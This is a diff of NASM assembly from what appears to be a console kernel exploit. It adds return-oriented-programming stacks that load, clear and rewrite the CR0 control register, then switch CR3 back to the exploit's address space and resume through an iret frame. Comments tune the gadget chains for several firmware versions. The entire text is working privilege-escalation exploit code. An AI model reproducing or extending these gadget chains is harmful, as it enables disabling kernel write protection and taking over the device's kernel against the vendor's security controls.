@@ -20,6 +20,9 @@ extern uelf_entry
 extern ist_errc
 extern ist_noerrc
 extern comparison_table
+extern cr0_load
+extern cr0_clear_store
+extern cr0_write_ret
 
 global _start
 
@@ -79,6 +82,22 @@ dq %%stack_after
 dq 0
 %%stack_after:
 dq nop_ret ; executed by ret, or consumed as rbp by pop rbp; ret
+%endmacro
+
+; Switch back to the UELF address space and resume the suspended yield().
+; This is instantiated for both CR0 stacks so neither path needs a stack-pivot
+; gadget whose offset and epilogue would add another firmware dependency.
+%macro return_to_uelf 0
+pokeq ist_noerrc, ist_after_write_cr3
+dq justreturn_pop
+dq 0
+dq 0
+dq uelf_cr3
+dq mov_cr3_rax_mov_ds
+dq 0x20
+dq 0x102
+dq 0
+dq 0
 %endmacro
 
 ; cmpb ptr1, ptr2, is_less, is_equal, is_greater
@@ -480,8 +499,40 @@ dq pop_all_iret
 regs_for_exit:
 times iret_rip+40 db 0
 
+; UELF treats the trap number as regs[NREGS].  Keep these legacy fields
+; directly after the architectural frame; moving them breaks every
+; RUN_GADGET_RESULT_FULL_WITH_TRAP caller, including the 2.50 fallback.
 intno:
 dq 0
 
 justreturn_bak:
 times 5 dq 0
+
+; CR0 save/clear stack.  The padding slots normalize helpers which end in
+; either RET (2.50) or POP RBP; RET (4.03/7.61/9.40).
+times fpu_cr0_enter_stack_offset-($-regs_for_exit) db 0
+fpu_cr0_enter_stack:
+dq cr0_load
+dq nop_ret
+dq cr0_clear_store
+dq nop_ret
+dq cr0_write_ret
+dq nop_ret
+dq store_rax_rdi
+dq nop_ret
+return_to_uelf
+
+; CR0 restore stack, entered with the original value already in RAX.
+times fpu_cr0_exit_stack_offset-($-regs_for_exit) db 0
+fpu_cr0_exit_stack:
+dq nop_ret
+dq store_rax_rdi
+dq nop_ret
+return_to_uelf
+
+; The capture helper writes its machine-state snapshot here.  The cleared CR0
+; is stored separately so an invalid/partial capture cannot be mistaken for a
+; successfully cleared value.
+times fpu_cr0_scratch_offset-($-regs_for_exit) db 0
+times 0x200 db 0
+dq 0
